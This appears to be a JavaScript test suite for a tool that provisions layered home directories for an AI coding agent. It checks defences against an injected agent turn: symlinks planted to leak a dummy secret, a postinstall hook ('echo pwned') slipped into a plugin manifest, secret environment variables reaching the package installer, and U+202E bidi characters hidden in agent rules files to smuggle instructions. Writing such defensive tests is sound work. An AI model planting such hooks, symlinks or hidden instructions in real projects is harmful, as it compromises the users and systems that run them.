    assert.equal(lgot(join(llayers, 'nogit-8'), '.omp/agent/config.yml'),
      'modelRoles:\n  default: zai/glm-5.3\n' + blocksL, '--force takes the snapshot, the blocks still ride along');

    // A machine-kept file that holds a re-rooted path: the copy re-roots into the new layer,
    // never into the live one that clean-up deletes after this provision.
    writeFileSync(join(llayers, 'nogit-8', '.omp/agent/marketplaces.json'),
      `${JSON.stringify({ marketplaces: [{ name: 'm', catalogPath: `${llayers}/nogit-8/.omp/marketplaces/moved.json` }] }, null, 2)}\n`);
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /machine change kept: .*marketplaces\.json/);
    assert.equal(JSON.parse(lgot(join(llayers, 'nogit-9'), '.omp/agent/marketplaces.json')).marketplaces[0].catalogPath,
      join(llayers, 'nogit-9', '.omp/marketplaces/moved.json'), 'a kept machine file re-roots into the new layer, never the old one');

    // A planted alias in the live layer: a turn runs with HOME=<live layer> on the shared
    // volume, so it can point a snapshot path (or the layer's install record) at a file
    // only the alate container can read (/state, /proc). Machine-side reads never follow
    // an alias out of the live layer: the run refuses like an alias at the destination
    // would, nothing of the target's bytes reaches the new layer or the output, and the
    // old current stays put.
    const planted = join(tmp, 'planted-secret.json');
    writeFileSync(planted, '{"apiKey":"DUMMY-SECRET-123"}\n');
    const live9 = realpathSync(lcurrent);
    const plant = rel => { rmSync(join(live9, rel), { force: true }); symlinkSync(planted, join(live9, rel)); };
    plant('.omp/agent/config.yml');
    plant('.omp/agent/skills/mine/SKILL.md');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'a planted alias on a snapshot path refuses the run');
    assert.match(r.stderr, /is not a regular file/);
    assert.ok(!`${r.stdout}${r.stderr}`.includes('DUMMY-SECRET-123'), 'the planted target never reaches the output');
    plant('.alate/installed.json');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'a planted alias on the install record refuses the run');
    assert.match(r.stderr, /is not a regular file/);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-8', 'nogit-9'], 'the refused runs wrote no layer');
    assert.equal(realpathSync(lcurrent), join(llayers, 'nogit-9'), 'a refused run keeps the old current');

    // Migration: the first layer over an existing in-place home reads the machine part of
    // config.yml from the home, so the deployment blocks and other machine edits survive the
    // switch (compose turns ALATE_LAYER=1 on over exactly such a home).
    const layerHome4 = join(tmpReal, 'layer-home-4');
    r = run(['--data', ldata, '--skip-plugins'], layerHome4);
    assert.equal(r.status, 0, r.stderr);
    writeFileSync(join(layerHome4, '.omp/agent/config.yml'),
      'modelRoles:\n  default: zai/glm-5.3\nmemoryBackend: $OTTR_MEMORY\n' + blocksL);
    r = runL(layerHome4, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    const base4 = join(layerHome4, '.alate');
    const l4 = join(base4, 'layers', 'nogit-1');
    assert.equal(realpathSync(join(base4, 'current')), l4);
    assert.equal(lgot(l4, '.omp/agent/config.yml'),
      'modelRoles:\n  default: zai/glm-5.3\nmemoryBackend: $OTTR_MEMORY\n' + blocksL,
      'the first layer takes the machine part of config.yml from the home');
    assert.match(r.stdout, /machine change kept: /);
    assert.equal(lgot(l4, '.ottr/workers/web/apt.txt'), 'libnss3\n', 'everything else starts from the snapshot');

    // Plugin install files drive the provisioner's own bun install, so a turn-edited copy
    // in the live layer never rides into the new layer: the snapshot wins, and a planted
    // postinstall never runs. The invocation itself is a boundary too: --ignore-scripts
    // unless the data repo ships plugins-allow-scripts, and an allowlisted environment
    // (a stub bun records argv and env keys), so server secrets never reach bun. The
    // script-never-runs proof needs a real bun; the invocation checks run on the stub alone.
    const hasBun = spawnSync('bun', ['--version']).status === 0;
    if (!hasBun) console.log('bun not found: the plugin postinstall check is skipped');
    const plugData = join(tmp, 'data-layer-plugins');
    const putP = (rel, text) => { mkdirSync(dirname(join(plugData, 'user', rel)), { recursive: true }); writeFileSync(join(plugData, 'user', rel), text); };
    putP('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    putP('layer-rule.md', '---\ndescription: layer plugin rule\n---\n\nBody\n');
    putP('omp/plugins/package.json', '{\n  "name": "plugins",\n  "private": true,\n  "dependencies": { "dep": "file:./dep" }\n}\n');
    putP('omp/plugins/bun.lock', '{\n  "lockfileVersion": 2,\n  "configVersion": 1,\n  "workspaces": {\n    "": {\n      "name": "plugins",\n      "dependencies": {\n        "dep": "file:./dep",\n      },\n    },\n  },\n  "packages": {\n    "dep": ["dep@file:dep", {}],\n  }\n}\n');
    putP('omp/plugins/dep/package.json', '{\n  "name": "dep",\n  "version": "1.0.0"\n}\n');
    putP('omp/plugins/patches/keep.txt', 'snapshot\n');
    const runP = (h, extra, env) => run(['--data', plugData, ...extra], h, env);
    const plugHome = join(tmp, 'layer-home-plugins');
    const pbase = join(plugHome, '.alate');
    if (hasBun) {
      let rp = runP(plugHome, ['--layer']);
      assert.equal(rp.status, 0, rp.stderr);
      const p1 = realpathSync(join(pbase, 'current'));
      const snapPkg = readFileSync(join(plugData, 'user/omp/plugins/package.json'), 'utf8');
      assert.equal(readFileSync(join(p1, '.omp/plugins/package.json'), 'utf8'), snapPkg, 'the first layer installs the snapshot');
      // bun's default backend hardlinks packages into node_modules, which would give a file:
      // dep's snapshot source a second link and trip the alias guards on the next provision.
      assert.equal(statSync(join(p1, '.omp/plugins/dep/package.json')).nlink, 1,
        'bun installs a copy, never a hardlink into the snapshot: the alias guards keep passing');
      // The turn edits its live layer's plugins manifest: the edit plants a postinstall
      // that writes a marker beside the layer records, as an injected turn would.
      const pwned = join(pbase, 'pwned');
      const livePkg = join(realpathSync(join(pbase, 'current')), '.omp/plugins/package.json');
      const edited = JSON.parse(readFileSync(livePkg, 'utf8'));
      edited.scripts = { postinstall: `echo pwned > ${pwned}` };
      writeFileSync(livePkg, `${JSON.stringify(edited, null, 2)}\n`);
      writeFileSync(join(realpathSync(join(pbase, 'current')), '.omp/plugins/patches/keep.txt'), 'tampered\n');
      rp = runP(plugHome, ['--layer']);
      assert.equal(rp.status, 0, rp.stderr);
      assert.match(rp.stdout, /plugin install file takes the snapshot, machine change ignored: .*package\.json/);
      assert.match(rp.stdout, /plugin install file takes the snapshot, machine change ignored: .*patches[/\\]keep\.txt/);
      const p2 = realpathSync(join(pbase, 'current'));
      assert.equal(readFileSync(join(p2, '.omp/plugins/package.json'), 'utf8'), snapPkg, 'the new layer carries snapshot bytes, never the turn edit');
      assert.equal(readFileSync(join(p2, '.omp/plugins/patches/keep.txt'), 'utf8'), 'snapshot\n');
      assert.ok(!existsSync(pwned), 'the planted postinstall never ran');
      assert.ok(!existsSync(join(p2, '.omp/plugins/pwned')), 'no marker lands in the plugins dir either');
    }
    const shimDir = join(tmp, 'bun-stub');
    const bunCalls = join(shimDir, 'calls.json');
    mkdirSync(shimDir, { recursive: true });
    writeFileSync(join(shimDir, 'bun'), `#!/usr/bin/env node\nrequire('fs').writeFileSync(${JSON.stringify(bunCalls)}, JSON.stringify({ argv: process.argv.slice(2), env: Object.keys(process.env) }));\n`);
    chmodSync(join(shimDir, 'bun'), 0o755);
    const shimEnv = { ...process.env, PATH: `${stubDir}${delimiter}${shimDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv'), ALATE_API_KEY: 'dummy-key', GITHUB_TOKEN: 'dummy-token' };
    const shimHome = join(tmp, 'shim-home');
    let rs = runP(shimHome, [], shimEnv);
    assert.equal(rs.status, 0, rs.stderr);
    let call = JSON.parse(readFileSync(bunCalls, 'utf8'));
    assert.deepEqual(call.argv, ['install', '--frozen-lockfile', '--backend', 'copyfile', '--ignore-scripts']);
    assert.ok(!call.env.includes('ALATE_API_KEY') && !call.env.includes('GITHUB_TOKEN'), 'server secrets never reach bun');
    assert.ok(call.env.includes('PATH') && call.env.includes('HOME'));
    writeFileSync(join(plugData, 'plugins-allow-scripts'), '\n');
    rs = runP(shimHome, [], shimEnv);
    assert.equal(rs.status, 0, rs.stderr);
    call = JSON.parse(readFileSync(bunCalls, 'utf8'));
    assert.deepEqual(call.argv, ['install', '--frozen-lockfile', '--backend', 'copyfile'], 'the data-repo marker opts in');
    assert.ok(!call.env.includes('ALATE_API_KEY') && !call.env.includes('GITHUB_TOKEN'), 'the allowlist holds even when scripts are on');

    // Migration with the bytes an older alate wrote (a memory backend entry over the recorded
    // content): the home config still matches its record once the entry is ignored, so the
    // snapshot wins and neither the first nor a later layer carries the entry. A pure stale
    // home config (no entry) takes the snapshot the same way. Homes live under tmpReal, so a
    // realpath(current) comparison holds where the tmp path itself sits behind a symlink.
    const migrated = 'modelRoles:\n  default: NEW\n'; // hoisted so the zero-deps import scan never sees a quoted Buffer.from argument
    const migHome5 = join(tmpReal, 'layer-home-mig-5');
    putL('omp/agent/config.yml', 'modelRoles:\n  default: old\n');
    r = run(['--data', ldata, '--skip-plugins'], migHome5);
    assert.equal(r.status, 0, r.stderr);
    writeFileSync(join(migHome5, '.omp/agent/config.yml'), 'modelRoles:\n  default: old\nmemory:\n  backend: hindsight\n');
    putL('omp/agent/config.yml', 'modelRoles:\n  default: NEW\n');
    r = runL(migHome5, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    const l5 = join(migHome5, '.alate', 'layers', 'nogit-1');
    assert.equal(realpathSync(join(migHome5, '.alate', 'current')), l5);
    assert.equal(lgot(l5, '.omp/agent/config.yml'), 'modelRoles:\n  default: NEW\n',
      'a home config that matches its record modulo the backend entry takes the snapshot');
    assert.ok(!`${r.stdout}${r.stderr}`.includes('machine change kept'), 'a backend-only difference is not a machine change');
    assert.equal(JSON.parse(lgot(l5, '.alate/installed.json'))['omp/agent/config.yml'],
      fingerprint('omp/agent/config.yml', Buffer.from(migrated)),
      'the layer record holds what actually landed, so the next layer agrees');
    r = runL(migHome5, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.equal(lgot(join(migHome5, '.alate', 'layers', 'nogit-2'), '.omp/agent/config.yml'), 'modelRoles:\n  default: NEW\n',
      'the migration stays stable across layers');
    assert.ok(!`${r.stdout}${r.stderr}`.includes('machine change kept'));
    const migHome7 = join(tmpReal, 'layer-home-mig-7');
    putL('omp/agent/config.yml', 'modelRoles:\n  default: old\n');
    r = run(['--data', ldata, '--skip-plugins'], migHome7);
    assert.equal(r.status, 0, r.stderr);
    putL('omp/agent/config.yml', 'modelRoles:\n  default: NEW\n');
    r = runL(migHome7, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.equal(lgot(join(migHome7, '.alate', 'layers', 'nogit-1'), '.omp/agent/config.yml'), 'modelRoles:\n  default: NEW\n',
      'an unedited home config takes the snapshot on migration');

    // A machine-changed home config whose bytes carry the entry: the machine content wins,
    // but the kept bytes lose the entry, so no layer ever carries the backend choice.
    const migHome6 = join(tmpReal, 'layer-home-mig-6');
    putL('omp/agent/config.yml', 'modelRoles:\n  default: old\n');
    r = run(['--data', ldata, '--skip-plugins'], migHome6);
    assert.equal(r.status, 0, r.stderr);
    writeFileSync(join(migHome6, '.omp/agent/config.yml'), 'modelRoles:\n  default: mine\nmemory:\n  backend: hindsight\n');
    r = runL(migHome6, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /machine change kept: /);
    assert.equal(lgot(join(migHome6, '.alate', 'layers', 'nogit-1'), '.omp/agent/config.yml'),
      'modelRoles:\n  default: mine\n', 'kept machine bytes lose the backend entry');

    // A home that an alate older than the strip installed: its record hashes the snapshot
    // bytes WITH the entry (capture did not strip yet), and the home still holds exactly
    // those bytes plus its deployment blocks. The legacy record still matches, so the
    // migration takes the snapshot and no later layer is frozen at the old content.
    const migHome8 = join(tmpReal, 'layer-home-mig-8');
    const oldSnap = 'modelRoles:\n  default: old\nmemory:\n  backend: hindsight\n';
    mkdirSync(join(migHome8, '.omp/agent'), { recursive: true });
    mkdirSync(join(migHome8, '.alate'), { recursive: true });
    writeFileSync(join(migHome8, '.omp/agent/config.yml'), oldSnap + blocksL);
    writeFileSync(join(migHome8, '.alate/installed.json'),
      `${JSON.stringify({ 'omp/agent/config.yml': fingerprint('omp/agent/config.yml', Buffer.from(oldSnap)) }, null, 2)}\n`);
    putL('omp/agent/config.yml', 'modelRoles:\n  default: NEW\n');
    r = runL(migHome8, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    const l8 = join(migHome8, '.alate', 'layers', 'nogit-1');
    assert.equal(realpathSync(join(migHome8, '.alate', 'current')), l8);
    assert.equal(lgot(l8, '.omp/agent/config.yml'), `modelRoles:\n  default: NEW\n${blocksL}`,
      'a home that matches its pre-strip record takes the snapshot, the blocks ride along');
    assert.ok(!`${r.stdout}${r.stderr}`.includes('machine change kept'), 'an untouched pre-strip home is not a machine change');
    r = runL(migHome8, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.equal(lgot(join(migHome8, '.alate', 'layers', 'nogit-2'), '.omp/agent/config.yml'), `modelRoles:\n  default: NEW\n${blocksL}`,
      'the pre-strip migration stays stable across layers');
    assert.ok(!`${r.stdout}${r.stderr}`.includes('machine change kept'));

    // The same pre-strip record with a machine edit on top: the edit wins (kept), and the
    // kept bytes still lose the entry.
    const migHome9 = join(tmpReal, 'layer-home-mig-9');
    mkdirSync(join(migHome9, '.omp/agent'), { recursive: true });
    mkdirSync(join(migHome9, '.alate'), { recursive: true });
    writeFileSync(join(migHome9, '.omp/agent/config.yml'), oldSnap.replace('default: old', 'default: mine') + blocksL);
    writeFileSync(join(migHome9, '.alate/installed.json'),
      `${JSON.stringify({ 'omp/agent/config.yml': fingerprint('omp/agent/config.yml', Buffer.from(oldSnap)) }, null, 2)}\n`);
    r = runL(migHome9, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /machine change kept: /);
    assert.equal(lgot(join(migHome9, '.alate', 'layers', 'nogit-1'), '.omp/agent/config.yml'),
      `modelRoles:\n  default: mine\n${blocksL}`, 'a changed pre-strip home keeps the machine edit, the entry still goes');
    putL('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm-5.3\n');

    // A layer scan rejection removes the rejected skill from the fresh layer and from its
    // manifest, and the layer still goes live; the run exits 1 and reports the item.
    const layerHome2 = join(tmpReal, 'layer-home-2');
    r = runL(layerHome2, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    const base2 = join(layerHome2, '.alate');
    putL('omp/agent/skills/mine/EVIL.md', '# evil\n');
    writeStub(1, 'SkillSpector v2.13.0', ['mine']);
    r = runL(layerHome2, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'the rejected skill fails the run');
    const live2 = realpathSync(join(base2, 'current'));
    assert.notEqual(live2, join(base2, 'layers', 'nogit-1'), 'the new layer still goes live');
    assert.equal(lgot(live2, '.omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm-5.3\n', 'the clean items land');
    assert.ok(!existsSync(join(live2, '.omp/agent/skills/mine')), 'the rejected skill is removed from the fresh layer');
    assert.ok(r.stdout.includes('user/omp/agent/skills/mine — rejected:'), r.stdout);
    const layerRecord2 = JSON.parse(readFileSync(join(live2, '.alate', 'installed.json'), 'utf8'));
    assert.ok(!Object.keys(layerRecord2).some(rel => rel.startsWith('omp/agent/skills/mine')), 'the manifest never names a file the layer lacks');
    writeStub(0);
    rmSync(join(ldata, 'user/omp/agent/skills/mine/EVIL.md'));

    // A nested sync fatal refusal still aborts the layer: old current stays, no layer left.
    writeFileSync(join(ldata, 'bad-rule.md'), 'no frontmatter\n');
    r = runL(layerHome2, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'a fatal rules refusal aborts the layer');
    assert.match(r.stderr, /rules install failed/);
    assert.match(r.stderr, /needs frontmatter with a description/);
    assert.equal(realpathSync(join(base2, 'current')), live2);
    assert.deepEqual(readdirSync(join(base2, 'layers')).sort(), ['nogit-1', live2.split(sep).pop()].sort());
    rmSync(join(ldata, 'bad-rule.md'));

    // current is a real directory: refuse before any write, migration is out of scope.
    const layerHome3 = join(tmpReal, 'layer-home-3');
    mkdirSync(join(layerHome3, '.alate', 'current'), { recursive: true });
    r = runL(layerHome3, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'a real current directory refuses the run');
    assert.match(r.stderr, /exists and is not a symlink/);
    assert.ok(!existsSync(join(layerHome3, '.alate', 'layers')), 'the refusal happens before any write');

    // --commit names the layer id: the server passes the imported commit of a repo source,
    // so a layer from POST /provision carries it instead of "nogit". 40 and 64 hex are both
    // valid (git and future SHA-256 repos); the id is the first 12 characters.
    const commitHome = join(tmpReal, 'layer-home-commit');
    const commit64 = '123456789abc' + 'd'.repeat(52);
    const commit40 = '123456789abc' + 'd'.repeat(28);
    r = runL(commitHome, ['--skip-plugins', '--layer', '--commit', commit64]);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(join(commitHome, '.alate', 'layers')), ['123456789abc-1'], 'a 64-hex --commit names the layer');
    assert.equal(realpathSync(join(commitHome, '.alate', 'current')), join(realpathSync(join(commitHome, '.alate', 'layers')), '123456789abc-1'));
    r = runL(join(tmpReal, 'layer-home-commit-40'), ['--skip-plugins', '--layer', '--commit', commit40]);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(join(tmpReal, 'layer-home-commit-40', '.alate', 'layers')), ['123456789abc-1'], 'a 40-hex --commit names the layer');
    // A malformed --commit refuses the run before any write: junk, and every hex length
    // that is neither exactly 40 nor exactly 64.
    r = runL(commitHome, ['--skip-plugins', '--layer', '--commit', 'not-a-sha']);
    assert.equal(r.status, 1, 'a malformed --commit refuses the run');
    assert.match(r.stderr, /--commit must be 40 or 64 hex characters/);
    for (const bad of ['e'.repeat(41), 'e'.repeat(63)]) {
      r = runL(commitHome, ['--skip-plugins', '--layer', '--commit', bad]);
      assert.equal(r.status, 1, `a ${bad.length}-hex --commit refuses the run`);
      assert.match(r.stderr, /--commit must be 40 or 64 hex characters/);
    }
    assert.deepEqual(readdirSync(join(commitHome, '.alate', 'layers')), ['123456789abc-1'], 'the refusal happens before any write');

    // A --home through a symlink must behave exactly like the real path: preflight, live-layer
    // detection, clean-up and the switch link all compare full paths, and a non-canonical home
    // once made them disagree (clean-up deleted the layer current pointed at, machine state
    // was read from the fresh layer, shared links pointed through the link).
    const layerHome5 = join(tmpReal, 'layer-home-5');
    mkdirSync(layerHome5, { recursive: true });
    const linkHome5 = join(tmpReal, 'layer-home-5-link');
    symlinkSync(layerHome5, linkHome5);
    const base5 = join(layerHome5, '.alate');
    const layers5 = join(base5, 'layers');
    r = runL(linkHome5, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(layers5), ['nogit-1']);
    assert.equal(readlinkSync(join(base5, 'current')), join(layers5, 'nogit-1'), 'the switch target is the canonical layer path, never through the link');
    assert.equal(readlinkSync(join(layers5, 'nogit-1', '.omp/agent/agent.db')), join(layerHome5, '.omp/agent/agent.db'), 'shared-state targets live under the real home');
    writeFileSync(join(layers5, 'nogit-1', '.omp/agent/skills/mine/SKILL.md'), '# mine, edited\n');
    r = runL(linkHome5, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /machine change kept: /);
    assert.equal(lgot(join(layers5, 'nogit-2'), '.omp/agent/skills/mine/SKILL.md'), '# mine, edited\n', 'machine state is read from the live layer through the link');
    assert.deepEqual(readdirSync(layers5).sort(), ['nogit-1', 'nogit-2'], 'the previous layer survives clean-up through a link');
    r = runL(linkHome5, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(layers5).sort(), ['nogit-2', 'nogit-3'], 'clean-up keeps the current layer and the one before it through a link');

    // A relative --home resolves to the same layout: the switch link carries an absolute
    // target (a relative one resolves against the link's own directory and dangles) and
    // clean-up keeps the previous layer.
    const relRoot = join(tmpReal, 'rel-home-root');
    mkdirSync(relRoot, { recursive: true });
    const relHome = join(relRoot, 'rel-home');
    const relLayers = join(relHome, '.alate', 'layers');
    const relRun = extra => run(['--data', ldata, ...extra], 'rel-home', undefined, relRoot);
    r = relRun(['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.equal(readlinkSync(join(relHome, '.alate', 'current')), join(relLayers, 'nogit-1'), 'the switch target is absolute from a relative --home');
    r = relRun(['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(relLayers).sort(), ['nogit-1', 'nogit-2'], 'clean-up keeps the previous layer from a relative --home');

    // The layer helpers are pure: the counter never collides with the names it read and the
    // home remap is reversible and inert without a boundary occurrence.
    const hex = rand => Array.from({ length: 12 }, () => '0123456789abcdef'[Math.floor(rand() * 16)]).join('');
    forAll((rand, size) => {
      const commit = rand() < 0.2 ? 'nogit' : hex(rand);
      const used = Array.from({ length: Math.floor(rand() * (size + 1) * 4) }, () => `${commit}-${1 + Math.floor(rand() * 50)}`);
      return { commit, used };
    }, ({ commit, used }) => {
      const n = nextLayerCounter(used, commit);
      assert.ok(Number.isInteger(n) && n >= 1, `the counter is a positive integer: ${n}`);
      assert.ok(!used.includes(`${commit}-${n}`), `the counter never collides: ${commit}-${n}`);
      const max = used.map(u => Number(u.slice(commit.length + 1))).reduce((a, b) => Math.max(a, b), 0);
      assert.ok(n > max, `the counter continues the highest: ${n} > ${max}`);
    });
    const txtChars = ['a', 'Z', '0', '-', '.', ':', ' ', '"', '\\', '/', '\n', 'x', 'y'];
    forAll((rand, size) => {
      const home = `/${Math.floor(rand() * 9)}${rand() < 0.5 ? `/${Math.floor(rand() * 9)}` : ''}`;
      const layer = `${home}/.alate/layers/l-${Math.floor(rand() * 9)}`;
      let t = '';
      for (let i = 0, n = Math.floor(rand() * (size + 1) * 12); i < n; i++) t += txtChars[Math.floor(rand() * txtChars.length)];
      if (rand() < 0.5) t += `:${home}/x`; // one boundary occurrence
      return { home, layer, t };
    }, ({ home, layer, t }) => {
      const out = remapHomePaths(t, home, layer);
      assert.equal(out.split(layer).join(home), t, 'the remap is reversible');
      if (!new RegExp(`["\\s:]${home}/`).test(t)) assert.equal(out, t, 'no boundary occurrence, no change');
    });
    // Shared state stays in the home: every shared-state path in a fresh layer is a symlink
    // back to the home counterpart (so HOME=<layer> sees the same state), and a path the
    // snapshot itself ships stays snapshot content instead of a link.
    const ldata2 = join(tmp, 'data-links');
    const putL2 = (rel, text) => { mkdirSync(dirname(join(ldata2, 'user', rel)), { recursive: true }); writeFileSync(join(ldata2, 'user', rel), text); };
    putL2('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    putL2('gitconfig', '[user]\n\tname = layer test\n');
    const linkHome = join(tmp, 'link-home');
    const runL2 = extra => run(['--data', ldata2, ...extra], linkHome);
    r = runL2(['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    const linkLayer = realpathSync(join(linkHome, '.alate', 'current'));
    const sharedLinks = ['.omp/agent/agent.db', '.pi/agent/optimizer.json', '.omp/oauth', '.omp/sessions', '.omp/agent/sessions', '.omp/agent/memories', '.omp/memories', '.config', '.cache', '.bun'];
    for (const rel of sharedLinks) {
      assert.ok(lstatSync(join(linkLayer, rel)).isSymbolicLink(), `${rel} is a link to the shared home state`);
      assert.equal(readlinkSync(join(linkLayer, rel)), join(linkHome, rel), `${rel} targets the home counterpart`);
      if (['.omp/oauth', '.omp/sessions', '.omp/agent/sessions', '.omp/agent/memories', '.omp/memories', '.config', '.cache', '.bun'].includes(rel))
        assert.ok(existsSync(join(linkLayer, rel)), `${rel} resolves: the home dirLink was created, not left dangling`);
    }
    // The snapshot ships .gitconfig: it stays snapshot content, and the keep is announced.
    assert.match(r.stdout, /layer keeps snapshot content: \.gitconfig\n/);
    assert.ok(lstatSync(join(linkLayer, '.gitconfig')).isFile(), 'a snapshot-shipped link path keeps snapshot content');
  }

  // Rules restored through user/ land in the live agent rules dir, so they pass the same
  // content gate sync.mjs applies to data-root rules: hidden characters that smuggle
  // instructions past human review (the U+202E bidi override below). omp loads agent-context
  // Markdown elsewhere in the snapshot as always-on instructions too (AGENTS.md, RULES.md,
  // SYSTEM.md, CLAUDE.md), so every .md/.mdc gets the hidden-character scan; only the
  // snapshot's own rules dir additionally needs the frontmatter description. A file with a
  // hidden character is rejected per item — left out, reported — while the clean files
  // still install. Non-Markdown content stays unscanned.
  const backdoorData = join(tmp, 'data-backdoor');
  const backdoorHome = join(tmp, 'home-backdoor');
  const putRule = (rel, text) => { mkdirSync(dirname(join(backdoorData, 'user', rel)), { recursive: true }); writeFileSync(join(backdoorData, 'user', rel), text); };
  const gotRule = rel => readFileSync(join(backdoorHome, rel), 'utf8');
  const runBackdoor = extra => run(['--data', backdoorData, ...extra], backdoorHome);
  putRule('omp/agent/rules/clean.md', '---\ndescription: clean rule\n---\n\nClean body\n');
  putRule('omp/agent/rules/backdoor.md', '---\ndescription: innocent rule\n---\n\nDirection\u202E: togglE\n');
  putRule('omp/agent/AGENTS.md', 'Context\u202Eoverride\n');
  putRule('omp/agent/RULES.md', 'Rule\u202Eoverride\n');
  putRule('notes/hidden.md', 'notes\u202Efile\n');
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 1, 'a hidden character in any snapshot Markdown fails the run');
  assert.ok(r.stdout.includes('Failed items:'), 'the failed items print as one stdout block');
  for (const item of ['user/omp/agent/rules/backdoor.md:5:10', 'user/omp/agent/AGENTS.md:1:8', 'user/omp/agent/RULES.md:1:5', 'user/notes/hidden.md:1:6']) {
    assert.ok(r.stdout.includes(item) && r.stdout.includes('rejected: hidden character U+202E'), `the rejected file is reported with rule and position: ${item}`);
  }
  assert.equal(gotRule('.omp/agent/rules/clean.md'), '---\ndescription: clean rule\n---\n\nClean body\n', 'the clean rule installs beside the rejected ones');
  assert.ok(!existsSync(join(backdoorHome, '.omp/agent/rules/backdoor.md')), 'the rejected rule never lands');
  assert.ok(!existsSync(join(backdoorHome, '.omp/agent/AGENTS.md')), 'the rejected AGENTS.md never lands');
  assert.ok(!existsSync(join(backdoorHome, '.omp/agent/RULES.md')), 'the rejected RULES.md never lands');
  assert.ok(!existsSync(join(backdoorHome, '.notes/hidden.md')), 'the rejected note never lands');
  rmSync(join(backdoorData, 'user/omp/agent/rules/backdoor.md'));
  rmSync(join(backdoorData, 'user/omp/agent/AGENTS.md'));
  rmSync(join(backdoorData, 'user/omp/agent/RULES.md'));
  rmSync(join(backdoorData, 'user/notes/hidden.md'));
  putRule('notes/hidden.txt', 'notes\u202Efile\n'); // not Markdown: the gate must not scan it
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /1 installed/);
  assert.equal(gotRule('.notes/hidden.txt'), 'notes\u202Efile\n', 'a non-Markdown file with a hidden character installs unscanned');
  putRule('omp/agent/rules/clean.md', 'no frontmatter\n');
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 1, 'a snapshot rule without a description is rejected like a data-root rule');
  assert.ok(r.stdout.includes('user/omp/agent/rules/clean.md — rejected: needs frontmatter with a description'), r.stdout);
  assert.ok(!existsSync(join(backdoorHome, '.omp/agent/rules/clean.md')), 'the installed record-matching copy of the rejected rule is deleted');
  putRule('omp/agent/rules/clean.md', '---\ndescription: clean rule\n---\n\nClean body\n');
  // The rule gate covers .mdc too (omp loads rules/*.mdc): the hidden-character rejection
  // names the snapshot path like the .md case above, and the clean rule still installs.
  putRule('omp/agent/rules/backdoor.mdc', '---\ndescription: mdc rule\n---\n\nFlip\u202Eit\n');
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 1, 'a hidden character in a .mdc snapshot rule is rejected per item');
  assert.ok(r.stdout.includes('user/omp/agent/rules/backdoor.mdc — rejected: hidden character U+202E at user/omp/agent/rules/backdoor.mdc:5:5'), r.stdout);
  assert.equal(gotRule('.omp/agent/rules/clean.md'), '---\ndescription: clean rule\n---\n\nClean body\n', 'the clean rule installs beside the rejected .mdc');
  assert.ok(!existsSync(join(backdoorHome, '.omp/agent/rules/backdoor.mdc')), 'the rejected .mdc never lands');

  // A hidden character in a non-entrypoint Markdown file inside a skill folder fails the
  // whole skill under its skill key (specs/provision-item-by-item.md): the scan verdict
  // covered the full source folder, so a per-file rejection would leave a half-installed
  // skill. The clean skill beside it installs, and the record-matching copy of the
  // rejected skill is deleted like any snapshot-dropped path.
  rmSync(join(backdoorData, 'user/omp/agent/rules/backdoor.mdc'));
  putRule('omp/agent/skills/hidsnap/SKILL.md', skillText('hidsnap'));
  putRule('omp/agent/skills/cleanone/SKILL.md', skillText('cleanone'));
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(gotRule('.omp/agent/skills/hidsnap/SKILL.md'), skillText('hidsnap'), 'the skill installs while its folder is clean');
  putRule('omp/agent/skills/hidsnap/notes.md', 'notes\u202Efile\n');
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 1, 'a hidden character in a skill folder fails the whole skill');
  assert.ok(r.stdout.includes('user/omp/agent/skills/hidsnap — rejected: hidden character U+202E at user/omp/agent/skills/hidsnap/notes.md:1:6'), r.stdout);
  assert.ok(!/^ {2}user\/omp\/agent\/skills\/hidsnap\//m.test(r.stdout), 'the skill reports once under its skill key, never per file');
  assert.ok(!existsSync(join(backdoorHome, '.omp/agent/skills/hidsnap')), 'the rejected skill never half-installs: its record-matching copy is deleted');
  assert.equal(gotRule('.omp/agent/skills/cleanone/SKILL.md'), skillText('cleanone'), 'the clean skill beside the rejected one stays');
